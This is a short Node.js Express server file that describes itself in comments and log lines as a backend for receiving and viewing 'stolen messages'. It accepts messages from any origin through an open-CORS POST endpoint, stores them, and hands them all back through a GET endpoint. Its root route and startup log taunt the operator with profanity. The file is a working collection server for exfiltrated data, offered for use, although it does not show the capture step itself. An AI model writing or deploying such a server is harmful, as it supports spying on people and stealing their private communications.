const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const app = express();

app.use(cors());
app.use(bodyParser.json());

let messages = [];

// API endpoint to receive stolen messages
app.post('/api/messages', (req, res) => {
  const message = req.body;
  messages.push(message);
  console.log('New message stolen:', message);
  res.sendStatus(200);
});

// API endpoint to fetch stolen messages
app.get('/api/messages', (req, res) => {
  res.json(messages);
});

// Handle root route
app.get('/', (req, res) => {
  res.send('Backend is running, you fucking genius. Use /api/messages to steal or view messages.');
});

// Use Render's provided port
const PORT = process.env.PORT || 10000;
app.listen(PORT, () => {
  console.log(`Backend server running on port ${PORT}, you fucking spy!`);
});
